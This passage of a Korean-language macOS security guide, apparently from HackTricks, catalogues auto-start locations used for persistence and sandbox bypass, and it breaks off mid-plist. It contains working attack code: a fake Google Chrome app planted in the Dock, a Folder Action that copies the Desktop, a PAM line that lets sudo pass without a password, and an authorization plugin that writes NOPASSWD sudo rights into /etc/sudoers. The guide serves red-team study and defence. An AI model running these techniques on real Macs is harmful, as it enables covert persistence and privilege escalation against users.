**ZIP** 파일을 **Login Item**으로 저장하면 **`Archive Utility`**가 해당 파일을 열게 됩니다. 예를 들어 zip 파일이 **`~/Library`**에 저장되어 있고, 그 안에 backdoor가 포함된 **`LaunchAgents/file.plist`** 폴더가 있다면 해당 폴더가 생성되고(기본적으로는 존재하지 않음) plist가 추가됩니다. 그러면 사용자가 다음에 다시 로그인할 때 plist에 지정된 **backdoor가 실행됩니다**.

또 다른 방법은 사용자 HOME 내부에 **`.bash_profile`** 및 **`.zshenv`** 파일을 생성하는 것입니다. 따라서 LaunchAgents 폴더가 이미 존재하더라도 이 technique은 계속 작동합니다.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 **`at`**을 **실행**해야 하며 **활성화되어 있어야** 합니다.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`**을 **실행**해야 하며 **활성화되어 있어야** 합니다.

#### **Description**

`at` task는 특정 시간에 실행할 **일회성 task를 예약**하도록 설계되었습니다. cron job과 달리 `at` task는 실행 후 자동으로 제거됩니다. 이러한 task는 시스템 reboot 이후에도 유지되므로, 특정 조건에서는 잠재적인 보안 문제가 될 수 있다는 점에 유의해야 합니다.<sup>[[16]](#references)</sup>

**기본적으로** 비활성화되어 있지만 **root** 사용자는 다음 명령으로 **활성화**할 수 있습니다.
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
1시간 후에 파일을 생성합니다:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq:`를 사용하여 작업 큐를 확인하세요.
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
위에서 두 개의 예약된 job을 확인할 수 있습니다. `at -c JOBNUMBER`를 사용하여 job의 세부 정보를 출력할 수 있습니다.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks가 활성화되어 있지 않으면 생성된 tasks가 실행되지 않습니다.

**job files**는 `/private/var/at/jobs/`에서 찾을 수 있습니다.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
파일명에는 queue, job number, 그리고 실행이 예약된 시간이 포함됩니다. 예를 들어 `a0001a019bdcd2`를 살펴보겠습니다.

- `a` - queue입니다.
- `0001a` - hex 형식의 job number이며, `0x1a = 26`입니다.
- `019bdcd2` - hex 형식의 시간입니다. epoch 이후 경과한 분을 나타냅니다. `0x019bdcd2`는 10진수로 `26991826`입니다. 여기에 60을 곱하면 `1619509560`이 되며, 이는 `GMT: 2021. April 27., Tuesday 7:46:00`입니다.

job file을 출력하면 `at -c`를 사용해 확인한 것과 동일한 정보가 포함되어 있음을 알 수 있습니다.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 Folder Actions를 구성하려면 **`System Events`**에 접촉하기 위해 인수를 사용하여 `osascript`를 호출할 수 있어야 합니다.
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop, Documents, Downloads와 같은 기본적인 TCC 권한이 있습니다.

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root 권한 필요
- **Trigger**: 지정된 folder에 대한 Access
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: 지정된 folder에 대한 Access

#### Description & Exploitation

Folder Actions는 항목 추가 또는 제거와 같은 folder의 변경이나 folder window 열기 또는 크기 조정과 같은 기타 동작에 의해 자동으로 trigger되는 script입니다. 이러한 action은 다양한 작업에 활용할 수 있으며, Finder UI 또는 terminal command를 사용하는 등 여러 방식으로 trigger할 수 있습니다.<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions를 설정하는 방법은 다음과 같습니다.

1. [Automator](https://support.apple.com/guide/automator/welcome/mac)로 Folder Action workflow를 작성하고 service로 설치합니다.
2. folder의 context menu에 있는 Folder Actions Setup을 통해 script를 수동으로 연결합니다.
3. OSAScript를 사용하여 `System Events.app`에 Apple Event message를 전송하고 Folder Action을 programmatically하게 설정합니다.
- 이 방법은 action을 system에 삽입하는 데 특히 유용하며, 일정 수준의 persistence를 제공합니다.

다음 script는 Folder Action에 의해 실행될 수 있는 예시입니다:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
위 스크립트를 Folder Actions에서 사용할 수 있도록 다음 명령으로 컴파일합니다:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
스크립트가 컴파일되면 아래 스크립트를 실행하여 Folder Actions를 설정합니다. 이 스크립트는 Folder Actions를 전역적으로 활성화하고, 이전에 컴파일한 스크립트를 Desktop 폴더에 구체적으로 연결합니다.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
다음 명령으로 설정 스크립트를 실행합니다:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- GUI를 통해 이러한 persistence를 구현하는 방법은 다음과 같습니다:

다음은 실행될 script입니다:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
다음 명령으로 컴파일합니다: `osacompile -l JavaScript -o folder.scpt source.js`

다음 위치로 이동합니다:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
그런 다음 `Folder Actions Setup` 앱을 열고 **감시하려는 폴더**를 선택한 후, 사용자의 경우 **`folder.scpt`**를 선택합니다(저의 경우에는 이를 output2.scp라고 이름 지었습니다):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

이제 **Finder**로 해당 폴더를 열면 script가 실행됩니다.

이 configuration은 **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**에 있는 **plist**에 base64 형식으로 저장되었습니다.

이제 GUI access 없이 이 persistence를 준비해 보겠습니다:

1. 백업을 위해 **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**를 `/tmp`로 **복사**합니다:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 방금 설정한 Folder Actions를 **제거**합니다:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

이제 비어 있는 환경이 준비되었습니다.

3. 백업 파일을 복사합니다: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. 이 configuration을 적용하기 위해 Folder Actions Setup.app을 엽니다: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> 그런데 저에게는 작동하지 않았으며, 다음은 writeup의 지침입니다:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- sandbox 우회에 유용: [✅](https://emojipedia.org/check-mark-button)
- 하지만 system 내부에 malicious application을 설치해야 합니다.
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: 사용자가 Dock 내부의 app을 클릭할 때

#### Description & Exploitation

Dock에 표시되는 모든 application은 **`~/Library/Preferences/com.apple.dock.plist`** 내부에 지정됩니다.<sup>[[19]](#references)</sup>

다음과 같이 **application을 추가**할 수 있습니다:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
**social engineering**을 사용하면 **Google Chrome** 등을 사칭하여 dock 내부에서 실제로 자신의 script를 실행할 수 있습니다:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### 색상 선택기

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- sandbox를 우회하는 데 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 매우 특정한 action이 발생해야 함
- 다른 sandbox로 이동하게 됨
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- `/Library/ColorPickers`
- root 필요
- Trigger: 색상 선택기 사용
- `~/Library/ColorPickers`
- Trigger: 색상 선택기 사용

#### 설명 및 Exploit

**코드가 포함된 color picker** bundle을 compile하고 ([Screen Saver 섹션](macos-auto-start-locations.md#screen-saver)의 예시와 같이) constructor를 추가한 다음 bundle을 `~/Library/ColorPickers`에 복사합니다.<sup>[[20]](#references)</sup>

그런 다음 color picker가 trigger되면 bundle도 함께 execute되어야 합니다.

library를 loading하는 binary에는 **매우 제한적인 sandbox**가 적용된다는 점에 유의하세요: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- sandbox 우회에 유용: **아니요. 자체 app을 실행해야 하기 때문입니다**
- TCC bypass: ???

#### Location

- 특정 app

#### Description & Exploit

[**여기에서 확인할 수 있는**](https://github.com/D00MFist/InSync) Finder Sync Extension이 포함된 app 예시입니다.

Application에는 `Finder Sync Extensions`를 포함할 수 있습니다. 이 extension은 실행될 application 내부에 들어갑니다. 또한 extension이 code를 실행하려면 **유효한 Apple developer certificate로 sign되어야 하며**, **sandboxed** 상태여야 하고(완화된 exception을 추가할 수는 있음), 다음과 같은 항목에 등록되어 있어야 합니다:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### 화면 보호기

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 일반적인 application sandbox에 들어가게 됩니다
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- `/System/Library/Screen Savers`
- Root 필요
- **Trigger**: 화면 보호기 선택
- `/Library/Screen Savers`
- Root 필요
- **Trigger**: 화면 보호기 선택
- `~/Library/Screen Savers`
- **Trigger**: 화면 보호기 선택

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 설명 및 Exploit

Xcode에서 새 프로젝트를 생성하고 템플릿을 선택하여 새로운 **Screen Saver**를 생성합니다. 그런 다음 여기에 code를 추가합니다. 예를 들어 다음 code를 사용하여 logs를 생성할 수 있습니다.<sup>[[23]](#references)[[24]](#references)</sup>

**Build**한 다음 `.saver` bundle을 **`~/Library/Screen Savers`**에 복사합니다. 그런 다음 Screen Saver GUI를 열고 해당 항목을 클릭하기만 하면 많은 logs가 생성됩니다:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> 이 코드를 로드하는 바이너리(`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`)의 entitlements 내부에서 **`com.apple.security.app-sandbox`**를 찾을 수 있으므로, **공통 application sandbox 내부에 있게 됩니다**.

Saver 코드:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 결국 application sandbox 안에 있게 됨
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandbox는 매우 제한적으로 보임

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Spotlight plugin이 관리하는 확장자를 가진 새 파일이 생성됨.
- `/Library/Spotlight/`
- **Trigger**: Spotlight plugin이 관리하는 확장자를 가진 새 파일이 생성됨.
- Root 필요
- `/System/Library/Spotlight/`
- **Trigger**: Spotlight plugin이 관리하는 확장자를 가진 새 파일이 생성됨.
- Root 필요
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Spotlight plugin이 관리하는 확장자를 가진 새 파일이 생성됨.
- 새 app 필요

#### Description & Exploitation

Spotlight는 macOS에 내장된 검색 기능으로, 사용자에게 **컴퓨터의 데이터에 빠르고 포괄적으로 액세스할 수 있도록 설계되었습니다**.\
이러한 신속한 검색 기능을 제공하기 위해 Spotlight는 **독점 데이터베이스**를 유지하고 **대부분의 파일을 parsing**하여 index를 생성하므로, 파일 이름과 파일 콘텐츠를 모두 빠르게 검색할 수 있습니다.<sup>[[25]](#references)</sup>

Spotlight의 기본 메커니즘에는 'mds'라는 central process가 사용되며, 이는 **'metadata server'**를 의미합니다. 이 process가 전체 Spotlight service를 조정합니다. 이와 함께 여러 'mdworker' daemon이 다양한 파일 형식의 index 생성과 같은 여러 maintenance task를 수행합니다 (`ps -ef | grep mdworker`). 이러한 task는 Spotlight importer plugin, 즉 **".mdimporter bundles"**를 통해 가능하며, 이 plugin은 Spotlight가 다양한 파일 형식의 콘텐츠를 이해하고 index할 수 있도록 합니다.

plugin 또는 **`.mdimporter`** bundle은 앞서 언급한 위치에 있으며, 새 bundle이 나타나면 1분 이내에 load됩니다(service를 restart할 필요 없음). 이러한 bundle은 **관리할 수 있는 file type과 extension**을 지정해야 하며, 이를 통해 Spotlight는 지정된 extension을 가진 새 파일이 생성될 때 해당 bundle을 사용합니다.

실행 중인 모든 **`mdimporters`**를 다음과 같이 **확인할 수 있습니다**:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
그리고 예를 들어 **/Library/Spotlight/iBooksAuthor.mdimporter**는 다음과 같은 유형의 파일(확장자 `.iba` 및 `.book` 등)을 구문 분석하는 데 사용됩니다:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> 다른 `mdimporter`의 Plist를 확인해도 **`UTTypeConformsTo`** 항목을 찾지 못할 수 있습니다. 이는 기본 제공되는 _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier))이므로 확장자를 지정할 필요가 없기 때문입니다.
>
> 또한 System 기본 플러그인이 항상 우선하므로, 공격자는 Apple 자체 `mdimporters`로 인덱싱되지 않는 파일에만 액세스할 수 있습니다.

자체 importer를 만들려면 다음 프로젝트에서 시작할 수 있습니다: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer). 그런 다음 이름과 **`CFBundleDocumentTypes`**를 변경하고, 지원하려는 확장을 지원하도록 **`UTImportedTypeDeclarations`**를 추가한 뒤 이를 **`schema.xml`**에 반영합니다.\
그다음 **`GetMetadataForFile`** 함수의 코드를 변경하여 처리 대상 확장자를 가진 파일이 생성될 때 payload를 실행하도록 합니다.

마지막으로 새 **`.mdimporter`**를 build하고 이전의 세 위치 중 하나로 복사합니다. **로그를 모니터링**하거나 **`mdimport -L`**을 실행하여 로드되었는지 확인할 수 있습니다.

### ~~Preference Pane~~

> [!CAUTION]
> 더 이상 작동하지 않는 것으로 보입니다.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- sandbox bypass에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 특정 사용자 작업이 필요함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

더 이상 작동하지 않는 것으로 보입니다.<sup>[[26]](#references)</sup>

## Root Sandbox Bypass

> [!TIP]
> 여기에서는 **root** 권한으로 파일에 무언가를 **작성하여** 간단히 실행할 수 있거나, 기타 **특이한 조건이 필요한** **sandbox bypass**에 유용한 start location을 확인할 수 있습니다.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 단, root 권한이 필요함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root 권한 필요
- **Trigger**: 해당 시간이 되었을 때
- `/etc/daily.local`, `/etc/weekly.local` 또는 `/etc/monthly.local`
- Root 권한 필요
- **Trigger**: 해당 시간이 되었을 때

#### Description & Exploitation

**`/System/Library/LaunchDaemons/com.apple.periodic*`**에 구성된 **launch daemons** 때문에 periodic scripts(**`/etc/periodic`**)가 실행됩니다. `/etc/periodic/`에 저장된 scripts는 **파일 소유자 권한으로 실행**되므로, 잠재적인 privilege escalation에는 사용할 수 없습니다.<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
실행될 다른 주기적 스크립트들은 **`/etc/defaults/periodic.conf`**에 지정되어 있습니다:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
`/etc/daily.local`, `/etc/weekly.local` 또는 `/etc/monthly.local` 파일을 작성할 수 있다면 해당 파일은 **언젠가는 실행됩니다**.

> [!WARNING]
> periodic script는 **해당 script의 소유자 권한으로 실행됩니다**. 따라서 일반 사용자가 script를 소유하고 있다면 해당 사용자로 실행됩니다(이로 인해 privilege escalation 공격이 방지될 수 있습니다).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 root 권한이 필요함
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 위치

- 항상 root 권한 필요

#### 설명 및 Exploitation

PAM은 macOS에서의 쉬운 실행보다는 **persistence** 및 malware에 더 중점을 두므로, 이 blog에서는 자세한 설명을 제공하지 않습니다. **이 technique을 더 잘 이해하려면 writeup을 읽어보세요**.<sup>[[28]](#references)</sup>

다음 명령으로 PAM modules를 확인합니다:
```bash
ls -l /etc/pam.d
```
PAM을 악용하는 persistence/privilege escalation technique은 모듈 `/etc/pam.d/sudo`를 수정하여 다음 줄을 맨 앞에 추가하는 것만큼 간단합니다:
```bash
auth       sufficient     pam_permit.so
```
그러면 다음과 같은 형태로 **보이게 됩니다**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
따라서 **`sudo`를 사용하려는 모든 시도가 작동합니다**.

> [!CAUTION]
> 이 디렉터리는 TCC로 보호되므로 사용자에게 접근 권한을 요청하는 prompt가 표시될 가능성이 매우 높다는 점에 유의하세요.

또 다른 좋은 예는 su입니다. 여기서는 PAM modules에 parameters를 전달할 수도 있으며(이 파일에도 backdoor를 삽입할 수 있습니다):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- sandbox 우회에 유용: [🟠](https://emojipedia.org/large-orange-circle)
- 하지만 root 권한이 필요하며 추가 설정을 해야 함
- TCC bypass: ???

#### 위치

- `/Library/Security/SecurityAgentPlugins/`
- root 권한 필요
- 또한 plugin을 사용하도록 authorization database를 구성해야 함

#### 설명 및 Exploitation

사용자가 로그인할 때 실행되어 persistence를 유지하도록 authorization plugin을 생성할 수 있습니다. 이러한 plugin을 만드는 방법에 대한 자세한 내용은 이전 writeup을 확인하세요. 단, 제대로 작성되지 않은 plugin은 사용자를 시스템에서 잠기게 할 수 있으며, 이 경우 recovery mode에서 Mac을 정리해야 하므로 주의해야 합니다.<sup>[[29]](#references)[[30]](#references)</sup>
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
번들을 로드할 위치로 **이동**:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
마지막으로 이 Plugin을 로드할 **rule**을 추가합니다:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
